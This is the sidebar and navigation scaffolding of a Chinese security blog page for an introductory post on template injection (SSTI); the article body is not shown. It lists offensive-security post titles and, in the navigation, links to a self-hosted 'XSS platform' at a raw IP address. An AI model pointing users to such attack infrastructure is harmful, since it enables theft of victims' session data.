<b>编辑推荐：</b>
<br>

· <a href="https://www.cnblogs.com/eventhorizon/p/17497359.html" target="_blank"> 如何在 long-running task 中调用 async 方法 </a>
    <br>
· <a href="https://www.cnblogs.com/coco1s/p/17495560.html" target="_blank">单标签下的日间/黑夜模式切换按钮效果</a>
    <br>
· <a href="https://www.cnblogs.com/tcjiaan/p/17487725.html" target="_blank">「.NET深呼吸」用代码写 WPF 控件模板</a>
    <br>
· <a href="https://www.cnblogs.com/jevonsflash/p/17489161.html" target="_blank">[MAUI]弧形进度条与弧形滑块的交互实现</a>
    <br>
· <a href="https://www.cnblogs.com/huangxincheng/p/17483537.html" target="_blank"> 记一次 .NET 某药材管理系统 卡死分析 </a>
    <br>
</div></div>
    <div id="under_post_card2"><div class="itnews under-post-card">
    <b>阅读排行：</b>
    <br>
 ·          <a href="https://www.cnblogs.com/cmt/p/17497412.html" target="_blank">【网站公告】园子被处罚，请大家不要发布/转载任何网络小说</a>
        <br>
 ·          <a href="https://www.cnblogs.com/chingho/p/17486465.html" target="_blank">适合Windows桌面、Material Design设计风格、WPF美观控件库【强烈推荐】</a>
        <br>
 ·          <a href="https://www.cnblogs.com/eventhorizon/p/17497359.html" target="_blank">如何在long-running task中调用async方法</a>
        <br>
 ·          <a href="https://www.cnblogs.com/tangyanzhi1111/p/17489381.html" target="_blank">C#/.Net的多播委托到底是啥？彻底剖析下</a>
        <br>
 ·          <a href="https://www.cnblogs.com/hejiale010426/p/17498629.html" target="_blank">如何取消Blazor Server烦人的重新连接？</a>
        <br>
</div></div>
    <div id="HistoryToday" class="under-post-card"></div>
    <script type="text/javascript">
        var commentManager = new blogCommentManager();
        commentManager.renderComments(0);
        fixPostBody();
        window.footnoteTipManager.generateFootnoteTips();

            window.tocManager.displayDisableTocTips = false;
            window.tocManager.generateToc();
            
                setTimeout(function() { countViews(cb_blogId, cb_entryId); }, 50);
            
            deliverT2();
            deliverC1C2();
            loadNewsAndKb();
            
                LoadPostCategoriesTags(cb_blogId, cb_entryId);
            
            LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
            GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
            loadOptUnderPost();
            GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);
                </script>
</div>

	</div><!--end: forFlow -->
	</div><!--end: mainContent 主体内容容器-->
	<div id="sideBar">
		<div id="sideBarMain">
			<div id="sidebar_news" class="newsItem">
    <h3 class="catListTitle">公告</h3>
<div id="blog-news"><div class="container">    <div class="menu-wrap optiscroll is-enabled" id="menuWrap" style="display:none"><div class=" optiscroll-content" style="right: -2px; bottom: -2px;">        <nav class="menu">            <!-- 个人简介 -->            <div class="introduce-box" style="background: url(&quot;https://files.dbnuo.com/wallpaper/menu_bg.gif&quot;) center center / 100% no-repeat rgb(0, 0, 0);">                <div class="introduce-head">                    <div class="introduce-via" id="menuBlogAvatar"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/20190124140229(1).png"></div>                </div>                <div id="introduce">
    昵称：
    <a href="https://home.cnblogs.com/u/bmjoker/">
        bmjoker
    </a>
    <br>
    园龄：
    <a href="https://home.cnblogs.com/u/bmjoker/" title="入园时间：2018-03-07">
        5年3个月
    </a>
    <br>
    粉丝：
    <a class="follower-count" href="https://home.cnblogs.com/u/bmjoker/followers/">
        604
    </a>
    <br>
    关注：
    <a class="folowing-count" href="https://home.cnblogs.com/u/bmjoker/followees/">
        21
    </a>
    <div id="p_b_follow" class="follow-tip">
<a href="javascript:void(0)" onclick="follow(&#39;c73a3809-7f71-486b-a353-08d5782f1af4&#39;)">+加关注</a></div>
    
</div>            </div>            <!-- 导航 -->            <div class="nav-title"></div>            <div class="icon-list">                <ul id="m-nav-list">                <li><a href="https://www.cnblogs.com/bmjoker/" target="_self"><i class="iconfont icon-homepage_fill"></i>首页</a></li><li><a href="https://msg.cnblogs.com/send/bmjoker" target="_blank"><i class="iconfont icon-zhifeiji"></i>联系</a></li><li><a href="javascript:void(0)" onclick="$(&#39;#blog_nav_rss&#39;).trigger(&#39;click&#39;);" data-rss="https://www.cnblogs.com/bmjoker/rss/"><i class="iconfont icon-qinmifu"></i>订阅</a></li><li><a href="https://i.cnblogs.com/" target="_blank"><i class="iconfont icon-setup_fill"></i>管理</a></li><li><a href="https://github.com/bmjoker" target="_blank"><i class="iconfont icon-qianzishenhe"></i>GitHub</a></li><li><a href="https://www.cnblogs.com/bmjoker" target="_blank"><i class="iconfont icon-qianzishenhe"></i>CNBlogs</a></li><li><a href="http://47.107.136.25/xsser//index.php?do=login" target="_blank"><i class="iconfont icon-qianzishenhe"></i>自建XSS平台</a></li></ul>            </div>            <!-- 日历 -->            <span id="calendar-box"><div id="blog-calendar" style="visibility: visible;">

<table id="blogCalendar" class="Cal" cellspacing="0" cellpadding="0" title="Calendar" border="0">
    <tbody>
        <tr>
            <td colspan="7">
                <table class="CalTitle" cellspacing="0" border="0">
                    <tbody>
                        <tr>
                            <td class="CalNextPrev">
                                <a href="javascript:void(0);" onclick="loadBlogCalendar(&#39;2023/05/23&#39;); return false;">&lt;</a>
                            </td>
                            <td align="center">2023年6月</td>
                            <td align="right" class="CalNextPrev">
                                <a href="javascript:void(0);" onclick="loadBlogCalendar(&#39;2023/07/23&#39;); return false;">&gt;</a>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </td>
        </tr>
    <tr>
        <th class="CalDayHeader" align="center" abbr="日" scope="col">日</th>
        <th class="CalDayHeader" align="center" abbr="一" scope="col">一</th>
        <th class="CalDayHeader" align="center" abbr="二" scope="col">二</th>
        <th class="CalDayHeader" align="center" abbr="三" scope="col">三</th>
        <th class="CalDayHeader" align="center" abbr="四" scope="col">四</th>
        <th class="CalDayHeader" align="center" abbr="五" scope="col">五</th>
        <th class="CalDayHeader" align="center" abbr="六" scope="col">六</th>
    </tr>
            <tr>
                            <td class="CalOtherMonthDay" align="center">28</td>
                            <td class="CalOtherMonthDay" align="center">29</td>
                            <td class="CalOtherMonthDay" align="center">30</td>
                            <td class="CalOtherMonthDay" align="center">31</td>
                        <td class="" align="center">
                            1
                        </td>
                        <td class="" align="center">
                            2
                        </td>
                    <td class="CalWeekendDay" align="center">
                        3
                    </td>
            </tr>
                <tr>
                        <td class="CalWeekendDay" align="center">
                            4
                        </td>
                            <td class="" align="center">
                                5
                            </td>
                            <td class="" align="center">
                                6
                            </td>
                            <td class="" align="center">
                                7
                            </td>
                            <td class="" align="center">
                                8
                            </td>
                            <td class="" align="center">
                                9
                            </td>
                        <td class="CalWeekendDay" align="center">
                            10
                        </td>
                </tr>
                <tr>
                        <td class="CalWeekendDay" align="center">
                            11
                        </td>
                            <td class="" align="center">
                                12
                            </td>
                            <td class="" align="center">
                                13
                            </td>
                            <td class="" align="center">
                                14
                            </td>
                            <td class="" align="center">
                                15
                            </td>
                            <td class="" align="center">
                                16
                            </td>
                        <td class="CalWeekendDay" align="center">
                            17
                        </td>
                </tr>
                <tr>
                        <td class="CalWeekendDay" align="center">
                            18
                        </td>
                            <td class="" align="center">
                                19
                            </td>
                            <td class="" align="center">
                                20
                            </td>
                            <td class="" align="center">
                                21
                            </td>
                            <td class="" align="center">
                                22
                            </td>
                            <td class="CalTodayDay" align="center">
                                23
                            </td>
                        <td class="CalWeekendDay" align="center">
                            24
                        </td>
                </tr>
                <tr>
                        <td class="CalWeekendDay" align="center">
                            25
                        </td>
                            <td class="" align="center">
                                26
                            </td>
                            <td class="" align="center">
                                27
                            </td>
                            <td class="" align="center">
                                28
                            </td>
                            <td class="" align="center">
                                29
                            </td>
                            <td class="" align="center">
                                30
                            </td>
                        <td class="CalOtherMonthDay" align="center">
                            1
                        </td>
                </tr>
                <tr>
                        <td class="CalOtherMonthDay" align="center">
                            2
                        </td>
                            <td class="CalOtherMonthDay" align="center">
                                3
                            </td>
                            <td class="CalOtherMonthDay" align="center">
                                4
                            </td>
                            <td class="CalOtherMonthDay" align="center">
                                5
                            </td>
                            <td class="CalOtherMonthDay" align="center">
                                6
                            </td>
                            <td class="CalOtherMonthDay" align="center">
                                7
                            </td>
                        <td class="CalOtherMonthDay" align="center">
                            8
                        </td>
                </tr>
    </tbody>
</table></div></span>            <!-- 找找看 -->            <div class="m-list-title" style="display: block;"><span>找找看</span></div>            <div class="m-icon-list" id="sb-sidebarSearchBox"><div id="sb_widget_my_zzk" class="div_my_zzk"><input id="q" type="text" onkeydown="return zzk_go_enter(event);" class="input_my_zzk"></div></div>            <!-- 积分与排名 -->            <div class="m-list-title"><span>积分排名<span class="iconfont icon-select m-list-title-select"></span></span></div>            <div class="m-icon-list" id="sb-sidebarScorerank"></div>            <!-- 最新随笔 -->            <div class="m-list-title"><span>最新随笔<span class="iconfont icon-select m-list-title-select"></span></span></div>            <div class="m-icon-list" id="sb-sidebarRecentposts"></div>            <!-- 我的标签 -->            <div class="m-list-title"><span>我的标签<span class="iconfont icon-select m-list-title-select"></span></span></div>            <div class="m-icon-list" id="sb-toptags"></div>            <!-- 随笔分类 -->            <div class="m-list-title" style="display: block;"><span>随笔分类<span class="iconfont icon-select m-list-title-select"></span></span></div>            <div class="m-icon-list" id="sb-classify"><div><ul><li><a href="https://www.cnblogs.com/bmjoker/category/1374318.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>Android app移动安全(14)</a></li><li><a href="https://www.cnblogs.com/bmjoker/category/1222815.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>csrf跨站请求伪造(4)</a></li><li><a href="https://www.cnblogs.com/bmjoker/category/1219542.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>docker之初体验(6)</a></li><li><a href="https://www.cnblogs.com/bmjoker/category/1423355.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>python自动化运维(10)</a></li><li><a href="https://www.cnblogs.com/bmjoker/category/1196755.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>SQL注入(6)</a></li><li><a href="https://www.cnblogs.com/bmjoker/category/1200606.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>web安全之中间件安全(3)</a></li><li><a href="https://www.cnblogs.com/bmjoker/category/1279049.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>Windows/Linux应急响应(7)</a></li><li><a href="https://www.cnblogs.com/bmjoker/category/1197209.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>xss跨站脚本攻击(9)</a></li><li><a href="https://www.cnblogs.com/bmjoker/category/1274773.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>XXE与SSRF服务器端请求伪造(9)</a></li><li><a href="https://www.cnblogs.com/bmjoker/category/1256326.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>常用工具(12)</a></li><li><a href="https://www.cnblogs.com/bmjoker/category/1224511.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>互联网业务中常见的逻辑漏洞(6)</a></li><li><a href="https://www.cnblogs.com/bmjoker/category/1196756.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>技术杂谈(36)</a></li><li><a href="https://www.cnblogs.com/bmjoker/category/1222870.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>命令执行漏洞(2)</a></li><li><a href="https://www.cnblogs.com/bmjoker/category/1390408.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>内网渗透(7)</a></li><li><a href="https://www.cnblogs.com/bmjoker/category/1224466.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>其他常见漏洞与漏洞复现(27)</a></li><li><a href="https://www.cnblogs.com/bmjoker/category/1201498.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>受益匪浅的ctf(25)</a></li><li><a href="https://www.cnblogs.com/bmjoker/category/1216086.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>文件包含漏洞(2)</a></li><li><a href="https://www.cnblogs.com/bmjoker/category/1207892.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>文件上传漏洞(8)</a></li><li><a href="https://www.cnblogs.com/bmjoker/category/1828639.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target=""><span class="iconfont icon-marketing_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>源码审计(7)</a></li></ul></div></div>            <!-- 文章分类 -->            <div class="m-list-title"><span>文章分类<span class="iconfont icon-select m-list-title-select"></span></span></div>            <div class="m-icon-list" id="sb-ArticleCategory"></div>            <!-- 阅读排行 -->            <div class="m-list-title" style="display: block;"><span>阅读排行<span class="iconfont icon-select m-list-title-select"></span></span></div>            <div class="m-icon-list" id="sb-topview"><div><ul><li><a href="https://www.cnblogs.com/bmjoker/p/9548962.html"><span class="iconfont icon-browse_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>10.Redis未授权访问漏洞复现与利用(59496)</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/13508538.html"><span class="iconfont icon-browse_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>1. SSTI（模板注入）漏洞（入门篇）(29485)</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/10336247.html"><span class="iconfont icon-browse_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>1.我所了解的内网渗透(20996)</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/10051014.html"><span class="iconfont icon-browse_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>9.利用msfvenom生成木马(18595)</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/9074291.html"><span class="iconfont icon-browse_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>8. CTF综合靶机渗透(一)(16953)</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/9892653.html"><span class="iconfont icon-browse_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>16.Tomcat弱口令 &amp;&amp; 后台getshell漏洞(15903)</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/9977881.html"><span class="iconfont icon-browse_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>8.使用hydra对端口进行爆破(14743)</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/8833316.html"><span class="iconfont icon-browse_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>3.黑客常用端口利用总结(14326)</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/10355979.html"><span class="iconfont icon-browse_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>5.内网渗透之PTH&amp;PTT&amp;PTK(13323)</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/9060833.html"><span class="iconfont icon-browse_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>2. docker 容器的管理（创建、查看、启动、终止、删除）(12937)</a></li></ul></div></div>            <!-- 推荐排行 -->            <div class="m-list-title" style="display: block;"><span>推荐排行<span class="iconfont icon-select m-list-title-select"></span></span></div>            <div class="m-icon-list" id="sb-topDiggPosts"><div><ul><li><a href="https://www.cnblogs.com/bmjoker/p/13508538.html"><span class="iconfont icon-like_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>1. SSTI（模板注入）漏洞（入门篇）(26)</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/8833316.html"><span class="iconfont icon-like_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>3.黑客常用端口利用总结(20)</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/9548962.html"><span class="iconfont icon-like_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>10.Redis未授权访问漏洞复现与利用(16)</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/9074291.html"><span class="iconfont icon-like_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>8. CTF综合靶机渗透(一)(11)</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/13742666.html"><span class="iconfont icon-like_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>3. php反序列化从入门到放弃(入门篇)(8)</a></li></ul></div></div>            <!-- 最新评论 -->            <div class="m-list-title" style="display: block;"><span>最新评论<span class="iconfont icon-select m-list-title-select"></span></span></div>            <div class="m-icon-list" id="sb-recentComments"><div><ul><li><a href="https://www.cnblogs.com/bmjoker/p/13508538.html"><span class="iconfont icon-pinglunzu" style="color: #888;font-size: 15px;margin-right: 5px;"></span>Re:1. SSTI（模板注入）漏洞（入门篇）</a><div style="padding-left: 1.5em;color: #777;position: relative;top: -5px;">大佬写的太详细了
</div><div style="text-align: right;color: #444;position: relative;top: -10px;">--CQY_57</div></li><li><a href="https://www.cnblogs.com/bmjoker/p/8833316.html"><span class="iconfont icon-pinglunzu" style="color: #888;font-size: 15px;margin-right: 5px;"></span>Re:3.黑客常用端口利用总结</a><div style="padding-left: 1.5em;color: #777;position: relative;top: -5px;">大佬，你的博客园配置能发下吗
</div><div style="text-align: right;color: #444;position: relative;top: -10px;">--Cold_Ying</div></li><li><a href="https://www.cnblogs.com/bmjoker/p/13742666.html"><span class="iconfont icon-pinglunzu" style="color: #888;font-size: 15px;margin-right: 5px;"></span>Re:3. php反序列化从入门到放弃(入门篇)</a><div style="padding-left: 1.5em;color: #777;position: relative;top: -5px;">很好，学到了
</div><div style="text-align: right;color: #444;position: relative;top: -10px;">--Tru1-</div></li><li><a href="https://www.cnblogs.com/bmjoker/p/13742666.html"><span class="iconfont icon-pinglunzu" style="color: #888;font-size: 15px;margin-right: 5px;"></span>Re:3. php反序列化从入门到放弃(入门篇)</a><div style="padding-left: 1.5em;color: #777;position: relative;top: -5px;">很好，学到了
</div><div style="text-align: right;color: #444;position: relative;top: -10px;">--Tru1-</div></li><li><a href="https://www.cnblogs.com/bmjoker/p/10723432.html"><span class="iconfont icon-pinglunzu" style="color: #888;font-size: 15px;margin-right: 5px;"></span>Re:7.内网渗透之windows认证机制</a><div style="padding-left: 1.5em;color: #777;position: relative;top: -5px;">大佬QQ联系方式呢
</div><div style="text-align: right;color: #444;position: relative;top: -10px;">--MKID1412</div></li><li><a href="https://www.cnblogs.com/bmjoker/p/10506623.html"><span class="iconfont icon-pinglunzu" style="color: #888;font-size: 15px;margin-right: 5px;"></span>Re:7. Smali基础语法总结</a><div style="padding-left: 1.5em;color: #777;position: relative;top: -5px;">请问博主阅读密码是多少、？？
</div><div style="text-align: right;color: #444;position: relative;top: -10px;">--caocol</div></li><li><a href="https://www.cnblogs.com/bmjoker/p/10723432.html"><span class="iconfont icon-pinglunzu" style="color: #888;font-size: 15px;margin-right: 5px;"></span>Re:7.内网渗透之windows认证机制</a><div style="padding-left: 1.5em;color: #777;position: relative;top: -5px;">@MKID1412 建议在练习中成长！可以从暗月，或者红日靶场（）来入门，学习内网的一些攻击手法 工具的使用（cs，msf） 内网信息搜集（存活扫描，定位域控，定位域管，密码抓取[本地+三方软件]）....</div><div style="text-align: right;color: #444;position: relative;top: -10px;">--bmjoker</div></li><li><a href="https://www.cnblogs.com/bmjoker/p/13742666.html"><span class="iconfont icon-pinglunzu" style="color: #888;font-size: 15px;margin-right: 5px;"></span>Re:3. php反序列化从入门到放弃(入门篇)</a><div style="padding-left: 1.5em;color: #777;position: relative;top: -5px;">太棒了 感谢感谢！
</div><div style="text-align: right;color: #444;position: relative;top: -10px;">--浪漫峨眉峰</div></li><li><a href="https://www.cnblogs.com/bmjoker/p/10723432.html"><span class="iconfont icon-pinglunzu" style="color: #888;font-size: 15px;margin-right: 5px;"></span>Re:7.内网渗透之windows认证机制</a><div style="padding-left: 1.5em;color: #777;position: relative;top: -5px;">大佬能否说下你的学习路线
</div><div style="text-align: right;color: #444;position: relative;top: -10px;">--MKID1412</div></li><li><a href="https://www.cnblogs.com/bmjoker/p/13653563.html"><span class="iconfont icon-pinglunzu" style="color: #888;font-size: 15px;margin-right: 5px;"></span>Re:2. SSTI（模板注入）漏洞（cms实例篇）</a><div style="padding-left: 1.5em;color: #777;position: relative;top: -5px;">感谢师傅的文章，学到很多
</div><div style="text-align: right;color: #444;position: relative;top: -10px;">--Joker-qi</div></li></ul></div></div>            <!-- 文章档案 -->            <div class="m-list-title"><span>文章档案<span class="iconfont icon-select m-list-title-select"></span></span></div>            <div class="m-icon-list" id="sb-articlearchive"></div>            <!-- 随笔档案 -->            <div class="m-list-title"><span>随笔档案<span class="iconfont icon-select m-list-title-select"></span></span></div>            <div class="m-icon-list" id="sb-record"></div>            <!-- 自定义列表 -->            <span id="menuCustomList"><div class="m-list-title" style="display: block;"><span>渗透平台</span></div><div class="m-icon-list"><div><ul><li><a href="https://www.shentoushi.top/"><span class="iconfont icon-brush_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>渗透师</a></li><li><a href="https://www.hackjie.com/"><span class="iconfont icon-brush_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>黑客街</a></li><li><a href="http://www.secsearch.top//"><span class="iconfont icon-brush_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>HackTA-黑塔</a></li><li><a href="https://www.ddosi.com/"><span class="iconfont icon-brush_fill" style="color: #888;font-size: 14px;margin-right: 5px;"></span>雨苁</a></li></ul></div></div></span>        </nav>        <button class="close-button" id="close-button">Close Menu</button>        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"></path>            <desc>Created with Snap</desc><defs></defs></svg>        </div>    </div><div class="optiscroll-v"><b class="optiscroll-vtrack"></b></div><div class="optiscroll-h"><b class="optiscroll-htrack"></b></div></div>    <button class="menu-button menu-button-scroll" id="open-button"></button>    <div class="content-wrap" id="content-wrap"></div><!-- /content-wrap --></div><div class="main-header" style="height: 40vh; background: url(&quot;https://w.wallhaven.cc/full/j8/wallhaven-j82g35.jpg&quot;) center center / cover no-repeat rgb(34, 34, 34);">    <canvas id="notHomeTopCanvas"></canvas>    <div class="vertical">        <div class="main-header-content inner" style="max-width: 100vw;">            <h1 class="page-title" id="homeTopTitle" style="display: none;">bmjoker</h1>            <h2 class="page-description" id="hitokoto"></h2>            <h3 class="page-author" id="hitokotoAuthor"></h3>            <h1 class="sb-title" id="sbTitle">
    1. SSTI（模板注入）漏洞（入门篇）
    

</h1>            <p class="article-info" id="articleInfo"><p class="article-info-text"><span class="postMeta"><i class="iconfont icon-time1"></i>发表于 2020-09-14 09:36<i class="iconfont icon-browse"></i>阅读：29495<i class="iconfont icon-interactive"></i>评论：4<i class="iconfont icon-hot"></i>推荐：26</span></p><a href="https://www.cnblogs.com/bmjoker/category/1828639.html" target="_blank"><span class="article-info-tag article-tag-class-color">源码审计</span></a></p>        </div>    </div>    <a class="scroll-down" href="javascript:void(0);" data-offset="-45" style="display: none;">        <span class="hidden">Scroll Down</span>        <i class="scroll-down-icon iconfont icon-fanhui"></i>    </a></div><div id="loading" style="display: none;"></div><div id="bottomProgressBar"><div id="top-progress-bar" style="position: relative; top: 0px; left: 0px; right: 0px; background-color: rgb(119, 182, 255); height: 2px; width: 1%; transition: width 0.2s ease 0s, opacity 0.6s ease 0s; opacity: 1;"></div></div><div id="rightMenu"><div id="rightDiggit" clickflg="false" onclick="votePost(13508538,&#39;Digg&#39;)"><span class="rightMenuSpan rightDiggitSpan">26</span><i class="iconfont icon-zan1"></i></div><div id="rightBuryit" clickflg="false" onclick="votePost(13508538,&#39;Bury&#39;)"><span class="rightMenuSpan rightBuryitSpan">0</span><i class="iconfont icon-buzan"></i></div><div id="attention" onclick="follow(&#39;c73a3809-7f71-486b-a353-08d5782f1af4&#39;)" clickflg="false"><span class="rightMenuSpan attentionSpan">关注</span><i class="iconfont icon-dianzan"></i></div><div id="toUpDown" data="up"><span class="rightMenuSpan toUpDownSpan">返回顶部</span><div id="toUpDownI" style="transform: rotate(0deg); transform-origin: 50% 50%;"><i class="iconfont icon-zhiding"></i></div></div></div>    
    <div id="sidebar_news_content"><script type="text/javascript">window['__document_write_ajax_callbacks__']['5']();</script><script type="text/javascript">window['__document_write_ajax_callbacks__']['1']();</script>
<script type="text/javascript">window['__document_write_ajax_callbacks__']['6']();</script><script type="text/javascript">window['__document_write_ajax_callbacks__']['7']();</script><script>window['__document_write_ajax_callbacks__']['2']();</script>
<script type="text/javascript">window['__document_write_ajax_callbacks__']['8']();</script><script>window['__document_write_ajax_callbacks__']['3']();</script>


<div id="profile_block">
    昵称：
    <a href="https://home.cnblogs.com/u/bmjoker/">
        bmjoker
    </a>
    <br>
    园龄：
    <a href="https://home.cnblogs.com/u/bmjoker/" title="入园时间：2018-03-07">
        5年3个月
    </a>
    <br>
    粉丝：
    <a class="follower-count" href="https://home.cnblogs.com/u/bmjoker/followers/">
        604
    </a>
    <br>
    关注：
    <a class="folowing-count" href="https://home.cnblogs.com/u/bmjoker/followees/">
        21
    </a>
    <div id="p_b_follow" class="follow-tip">
<a href="javascript:void(0)" onclick="follow(&#39;c73a3809-7f71-486b-a353-08d5782f1af4&#39;)">+加关注</a></div>
    <script type="text/javascript">window['__document_write_ajax_callbacks__']['9']();</script><script>window['__document_write_ajax_callbacks__']['4']();</script>
</div>
</div>
</div>
<script>loadBlogNews();</script>

 
</div>
<div id="sidebar_c3"></div>
			<script>loadBlogDefaultCalendar();</script>			
			<div id="leftcontentcontainer">
				<div id="blog-sidecolumn"><!-- 搜索 -->
<div id="sidebar_search" class="sidebar-block">
    <div id="sidebar_search" class="mySearch">
        <h3 class="catListTitle">搜索</h3>
        <div id="sidebar_search_box">
            <div id="widget_my_zzk" class="div_my_zzk">
                <input type="text" id="q" onkeydown="return zzk_go_enter(event);" class="input_my_zzk">&nbsp;<input onclick="zzk_go()" type="button" value="找找看" id="btnZzk" class="btn_my_zzk">
            </div>
            
        </div>
    </div>
</div>

<!-- 常用链接 -->


<!-- 最新随笔 -->


<!-- 我的标签 -->


<!-- 积分与排名 -->


<!-- 随笔分类、随笔档案、文章分类、新闻分类、相册、链接 -->
<div id="sidebar_categories">

    <div id="sidebar_postcategory" class="catListPostCategory sidebar-block">
        <h3 class="catListTitle">
            
    <a class="sidebar-card-title-a" href="https://www.cnblogs.com/bmjoker/post-categories">随笔分类</a>



        </h3>

        <ul>

                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/category/1374318.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">Android app移动安全(14)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/category/1222815.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">csrf跨站请求伪造(4)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/category/1219542.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">docker之初体验(6)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/category/1423355.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">python自动化运维(10)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
<a href="https://www.cnblogs.com/bmjoker/category/1196755.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">SQL注入(6)</a>
 
                </li>                
                <li data-category-list-item-visible="true" style="display: block">
                    
